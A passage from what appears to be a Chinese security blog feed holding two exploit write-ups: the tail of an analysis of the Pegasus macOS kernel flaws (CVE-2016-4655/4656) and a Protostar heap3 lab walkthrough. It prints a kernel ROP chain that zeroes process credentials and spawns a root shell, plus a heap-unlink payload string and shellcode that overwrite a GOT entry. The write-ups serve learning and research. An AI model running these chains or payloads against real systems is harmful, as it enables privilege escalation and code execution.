rel="external">Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip</a><br>首先将rip转移到0x20处</p><pre><code>*(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot</code></pre><p>然后通过交换rsp和eax值，将rip转移到0x00位置处，这一步的目的即在__PAGEZERO段上控制栈结构，因为每是将rsp的值pop到ret中，这也就是stack pivot技术。</p><pre><code>uint64_t *transfer = (uint64_t *)0x0;transfer[0] = ROP_POP_RSP(map);transfer[1] = (uint64_t)chain-&gt;chain;</code></pre><p>接着rip转移到<code>main-&gt;chain</code>，和前面一样ROP链一样，不过主链是为了达到提权的目的。<br>主链的代码  </p><pre><code>rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;));PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;));PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;));PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;));PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;));</code></pre><p>主链的执行过程其实原理并不复杂：</p><pre><code> chain prototype: proc = current_proc();//找到当前程序的credentials结构 ucred = proc_ucred(proc); posix_cred = posix_cred_get(ucred); bzero(posix_cred, (sizeof(int) * 3));//将组id设为0即提权为root thread_exception_return();//thread_exception_return只是让我们离开内核区域而不会panic，通常用于从内核陷阱返回。</code></pre><p>接下来的代码和之前一样，测试我们构造的dic是否有效：</p><pre><code>host_get_io_master(mach_host_self(), &amp;master); // get iokit master portkr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);if (kr != KERN_SUCCESS)    return;</code></pre><p>最后如果一切都顺利，我们检查当前进程<code>getuid</code>是否等于0，如果是就提权root成功，然后调用<code>system(&quot;/bin/bash&quot;)</code>弹出一个shell！</p><pre><code>if (getuid() == 0) {    puts(&quot;(+) got r00t!&quot;);    system(&quot;/bin/bash&quot;);}</code></pre><p>测试：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/pic/0-2.png?raw=true" alt="0-2"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的<a href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="external">黄大大</a>和<a href="http://blog.imjun.net/posts/restore-symbol-of-iOS-app/" target="_blank" rel="external">杨君大大</a>，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，UAF，Vtable等等等等。也印证了今天在微博上看到教主的那句话：<br><strong>学好书不求甚解，爱技术不论用处</strong>，当我去用之前所学去理解一个个知识点的时候才体会到后半句：<strong>每有会意便欣然忘食</strong></p><p><strong>PoC</strong><br>完整的Poc代码在<a href="https://github.com/NULL-ME/PegasusX">这里</a></p><p><strong>特别感谢</strong></p><ul><li><a href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="external">mrh</a> –这是黄大大的分析，黄大大是一个特别严谨细致的人，分析文章使人豁然开朗</li><li><a href="https://jndok.github.io/2016/10/04/pegasus-writeup/" target="_blank" rel="external">jndok’s blog</a> –本文大多基于jndok的分析，可以去看看原文的分析</li><li><a href="http://blog.imjun.net/posts/restore-symbol-of-iOS-app/" target="_blank" rel="external">杨君的小黑屋</a>–杨君大大特别有耐心，执着于技术，乐于分享技术</li></ul><p><strong>参考</strong><br>1.<a href="https://developer.apple.com/library/content/samplecode/SimpleUserClient/Listings/User_Client_Info_txt.html" target="_blank" rel="external">User Client Info.txt</a><br>2.<a href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Todesco-Attacking-The-XNU-Kernal-In-El-Capitain.pdf" target="_blank" rel="external">Attacking-The-XNU-Kernal-In-El-Capitain</a><br>3.<a href="https://bazad.github.io/2016/05/mac-os-x-use-after-free/" target="_blank" rel="external">Mac OS X Privilege Escalation via Use-After-Free: CVE-2016-1828</a><br>4.<a href="http://ho.ax/downloads/Defiling-Mac-OS-X-Ruxcon.pdf" target="_blank" rel="external">Defiling-Mac-OS-X-Ruxcon</a><br>5.<a href="https://www.exploit-db.com/exploits/39925/" target="_blank" rel="external">Apple Mac OSX Kernel - Exploitable NULL Dereference in CoreCaptureResponder Due to Unchecked Return Value</a><br>6.<a href="http://www.cnblogs.com/huxiao-tee/p/4660352.html" target="_blank" rel="external">认真分析mmap：是什么 为什么 怎么用</a><br>7.<a href="http://ho.ax/posts/2012/02/resolving-kernel-symbols/" target="_blank" rel="external">Resolving kernel symbols</a>  </p><p><strong>OSUnserializeBinary源码</strong></p><pre><code>OSObject *OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString){    OSObject ** objsArray;    uint32_t    objsCapacity;    uint32_t    objsIdx;    OSObject ** stackArray;    uint32_t    stackCapacity;    uint32_t    stackIdx;    OSObject     * result;    OSObject     * parent;    OSDictionary * dict;    OSArray      * array;    OSSet        * set;    OSDictionary * newDict;    OSArray      * newArray;    OSSet        * newSet;    OSObject     * o;    OSSymbol     * sym;    size_t           bufferPos;    const uint32_t * next;    uint32_t         key, len, wordLen;    bool             end, newCollect, isRef;    unsigned long long value;    bool ok;    if (errorString) *errorString = 0;    if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL);    if (3 &amp; ((uintptr_t) buffer)) return (NULL);    if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL);    bufferPos = sizeof(kOSSerializeBinarySignature);    next = (typeof(next)) (((uintptr_t) buffer) + bufferPos);    DEBG(&quot;---------OSUnserializeBinary(%p)\n&quot;, buffer);    objsArray = stackArray    = NULL;    objsIdx   = objsCapacity  = 0;    stackIdx  = stackCapacity = 0;    result   = 0;    parent   = 0;    dict     = 0;    array    = 0;    set      = 0;    sym      = 0;    ok = true;    while (ok)    {        bufferPos += sizeof(*next);        if (!(ok = (bufferPos &lt;= bufferSize))) break;        key = *next++;        len = (key &amp; kOSSerializeDataMask);        wordLen = (len + 3) &gt;&gt; 2;        end = (0 != (kOSSerializeEndCollecton &amp; key));        DEBG(&quot;key 0x%08x: 0x%04x, %d\n&quot;, key, len, end);        newCollect = isRef = false;        o = 0; newDict = 0; newArray = 0; newSet = 0;        switch (kOSSerializeTypeMask &amp; key)        {            case kOSSerializeDictionary:                o = newDict = OSDictionary::withCapacity(len);                newCollect = (len != 0);                break;            case kOSSerializeArray:                o = newArray = OSArray::withCapacity(len);                newCollect = (len != 0);                break;            case kOSSerializeSet:                o = newSet = OSSet::withCapacity(len);                newCollect = (len != 0);                break;            case kOSSerializeObject:                if (len &gt;= objsIdx) break;                o = objsArray[len];                o-&gt;retain();                isRef = true;                break;            case kOSSerializeNumber:                bufferPos += sizeof(long long);                if (bufferPos &gt; bufferSize) break;                value = next[1];                value &lt;&lt;= 32;                value |= next[0];                o = OSNumber::withNumber(value, len);                next += 2;                break;            case kOSSerializeSymbol:                bufferPos += (wordLen * sizeof(uint32_t));                if (bufferPos &gt; bufferSize)           break;                if (0 != ((const char *)next)[len-1]) break;                o = (OSObject *) OSSymbol::withCString((const char *) next);                next += wordLen;                break;            case kOSSerializeString:                bufferPos += (wordLen * sizeof(uint32_t));                if (bufferPos &gt; bufferSize) break;                o = OSString::withStringOfLength((const char *) next, len);                next += wordLen;                break;            case kOSSerializeData:                bufferPos += (wordLen * sizeof(uint32_t));                if (bufferPos &gt; bufferSize) break;                o = OSData::withBytes(next, len);                next += wordLen;                break;            case kOSSerializeBoolean:                o = (len ? kOSBooleanTrue : kOSBooleanFalse);                break;            default:                break;        }        if (!(ok = (o != 0))) break;        if (!isRef)        {            setAtIndex(objs, objsIdx, o);            if (!ok) break;            objsIdx++;        }        if (dict)        {            if (sym)            {                DEBG(&quot;%s = %s\n&quot;, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());                if (o != dict) ok = dict-&gt;setObject(sym, o);                o-&gt;release();                sym-&gt;release();                sym = 0;            }            else             {                sym = OSDynamicCast(OSSymbol, o);                ok = (sym != 0);            }        }        else if (array)         {            ok = array-&gt;setObject(o);            o-&gt;release();        }        else if (set)        {           ok = set-&gt;setObject(o);           o-&gt;release();        }        else        {            assert(!parent);            result = o;        }        if (!ok) break;        if (newCollect)        {            if (!end)            {                stackIdx++;                setAtIndex(stack, stackIdx, parent);                if (!ok) break;            }            DEBG(&quot;++stack[%d] %p\n&quot;, stackIdx, parent);            parent = o;            dict   = newDict;            array  = newArray;            set    = newSet;            end    = false;        }        if (end)        {            if (!stackIdx) break;            parent = stackArray[stackIdx];            DEBG(&quot;--stack[%d] %p\n&quot;, stackIdx, parent);            stackIdx--;            set   = 0;             dict  = 0;             array = 0;            if (!(dict = OSDynamicCast(OSDictionary, parent)))            {                if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));            }        }    }    DEBG(&quot;ret %p\n&quot;, result);    if (objsCapacity)  kfree(objsArray,  objsCapacity  * sizeof(*objsArray));    if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray));    if (!ok &amp;&amp; result)    {        result-&gt;release();        result = 0;    }    return (result);}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，
      
    
    </summary>
    
      <category term="iOSCVE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSCVE/"/>
    
    
      <category term="Pegasus" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Pegasus/"/>
    
      <category term="cve" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/cve/"/>
    
      <category term="CVE-2016-4655" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4655/"/>
    
      <category term="CVE-2016-4656" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4656/"/>
    
      <category term="PoC" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/PoC/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-堆溢出学习-滥用堆metadata重定向程序执行</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/26/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/26/Protostar-堆溢出系列学习-heap 3/Protostar-堆溢出系列学习-heap 3/</id>
    <published>2017-04-26T13:24:19.000Z</published>
    <updated>2017-05-02T14:35:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对<a href="https://null-me.github.io/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/" target="_blank" rel="external">linux堆管理DLMalloc的分析</a>这是一个滥用堆metadata导致free()函数造成任意地址写的一个漏洞利用。下面一步一步的分析</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;void winner(){  printf(&quot;that wasn&#39;t too bad now, was it? @ %d\n&quot;, time(NULL));}int main(int argc, char **argv){  char *a, *b, *c;  a = malloc(32);  b = malloc(32);  c = malloc(32);  strcpy(a, argv[1]);  strcpy(b, argv[2]);  strcpy(c, argv[3]);  free(c);  free(b);  free(a);  printf(&quot;dynamite failed?\n&quot;);}</code></pre><h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>在这个程序中虽然我们知道有堆溢出的问题，可是堆上并没有什么逻辑上的漏洞，没有可利用的指针？没有UAF漏洞？那怎么才能执行到<code>winner()</code>函数呢？似乎是不可能的事。但通过之前对linux堆管理的分析，可知<code>free()</code>函数中的<code>unlink()</code>函数能够造成一个任意地址写的可能，再像之前那样来修改GOT表，不就是可以执行<code>winner()</code>函数了吗？所以要执行unlink()函数就需要构造两个chunk合并的过程，继而将一个chunk从原来的双链表中unlink下来。<br>就照着这个思路来一步步实现这个过程。</p><h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.输入<code>AAAA</code> <code>BBBB</code> <code>CCCC</code>然后free前后后观察堆结构<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-0.png?raw=true" alt="0-0"><br>由上图可得，一共有三个分配的chunk，大小都为29(101001)末位表示前一个chunk正在使用。可以看到最后还有一个很大的chunk，这就是上文所指的topchunk。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-1.png?raw=true" alt="0-1"><br>因为chunk的大小<80字节，所以free后存在单链表的fastbin中，`1-->2–&gt;3–&gt;null`的方式连接  </80字节，所以free后存在单链表的fastbin中，`1--></p><p>2.因为需要unlink一个chunk到双链表bin，所以先覆盖掉第三个chunk让其大小为0x64=100字节。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-2.png?raw=true" alt="0-2"><br>因为我们准备向前合并，所以将preinuse位设为1，即64+1=65</p><p>3.然后还需要构造一个假的chunk让其unlink，这个chunk将精心构造，首先fd=GoT地址 bk=winner地址？等等，这里存在一个问题在于：GoT=winner地址，但winner=GoT在会发生段错误，所以这里有个小技巧在于bk=堆地址，GoT-12=堆地址，然后堆中填上shellcode，去调用winner。<br>构造字符串：<br><code>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x0c\xc0\x04\x08</code><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-3.png?raw=true" alt="0-3"></p><p>4.现在我们需要构造shellcode，因为堆地址+16字节出会写入GoT地址，所以我们的shellcode要足够小，正好我们仅仅需要调用winner而已。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-4.png?raw=true" alt="0-4"><br>这里我们用在线的转换工具下面的汇编转化为x86指令字符串</p><pre><code>mov eax,0x8048864call eax</code></pre><p><code>0x8048864</code>为winner()函数地址</p><p>5.将上面的shellcode写入第一个chunk那里，here we hack！<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-5.png?raw=true" alt="0-5"><br>下图可以看到shellcode后面就被填入了GoT地址，也说明了shellcode只能为8字节大小。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-6.png?raw=true" alt="0-6"><br>GoT地址已经修改，下面可以看到已经执行了winnwe()函数<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-7.png?raw=true" alt="0-7"></p><h2 id="0x04-一点补充"><a href="#0x04-一点补充" class="headerlink" title="0x04 一点补充"></a>0x04 一点补充</h2><p>在上面构造chunk中，也许你已经发现了chunk大小为<code>0xfffffffc</code>，这是一个什么巧妙的方法去绕过free()里面的检查等。具体的细节可以看<br><a href="http://phrack.org/issues/57/9.html#article" target="_blank" rel="external">Once upon a free()</a>这篇文章，简单的说就是当某个数加上<code>0xfffffffc</code>时会造成溢出相当于减4从而使其向前偏移4个字节，绕过检查，避免崩溃。</p><h2 id="0x05-堆漏洞学习总结"><a href="#0x05-堆漏洞学习总结" class="headerlink" title="0x05 堆漏洞学习总结"></a>0x05 堆漏洞学习总结</h2><p>目前可能这是最后一个堆漏洞的学习，这个堆漏洞的学习理解到动手前后花费了大量时间，不过这都是值得的，如果能够坚持下来，将会对堆漏洞有一个清晰的认识。以后再遇到漏洞或者别人的分析能够快速准确的理解。虽然现在堆管理代码经过了很多改善和patch，但基本和关键的技术还是没变。所以keep hacking!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对&lt;a href=&quot;ht
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
      <category term="metadata" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/metadata/"/>
    
      <category term="DLMalloc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/DLMalloc/"/>
    
  </entry>
  
</feed>
